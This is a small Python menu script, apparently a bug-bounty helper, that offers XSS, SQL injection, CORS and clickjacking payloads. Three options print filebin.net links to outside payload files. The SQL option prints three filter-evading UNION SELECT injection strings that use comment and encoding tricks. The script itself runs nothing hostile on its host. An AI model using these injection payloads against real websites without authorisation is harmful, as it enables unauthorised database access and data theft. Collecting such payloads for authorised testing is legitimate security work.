import os
import sys
import time

os.system("clear")
print("\033[32;1m ")
os.system("figlet Payload Script Bug Hunter")
print("==================")
print("My Github:")
print("==================")
print("1)Payload Xss")
print("2)Payload Sql")
print("3)Payload Cors")
print("4)Payload Clickjacking")
print("5)Exit")
print("==================")
select = input("Please Select!:") 
if select =="1":
	print("wait... are looking for xss payload data")
	time.sleep(5)
	print("=================")
	print("here it is the xss payload file, please access it")
	print("https://filebin.net/d6i2vnrsmqjkh82o")
	print("=================")
elif select =="2":
	print("wait... are looking for sql payload data")
	time.sleep(5)
	print("================")
	print("here it is payload sql please take it")
	print("Payload 1: +AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+")
	print("Payload 2: +AND+0+UNION/**/DISTINCTROW+SELECT+11111")
	print("Payload 3: And/**/.0union/*%26*/distinctROW+select")
	print("================")
elif select =="3":
	print("wait... are looking for cors payload data")
	time.sleep(5)
	print("================")
	print("here it is the cors payload file, please access it")
	print("https://filebin.net/dpqn7x6yqbo9qf85")
	print("================")
elif select =="4":
		print("wait... are looking for cors payload data")
		time.sleep(5)
		print("==================")
		print("here it is the clickjacking payload file, please access it")
		print("https://filebin.net/9vys2pivw99c6k1a")
		print("==================")
elif select =="5":
	print("Oke Good Bye")
	
	
	
	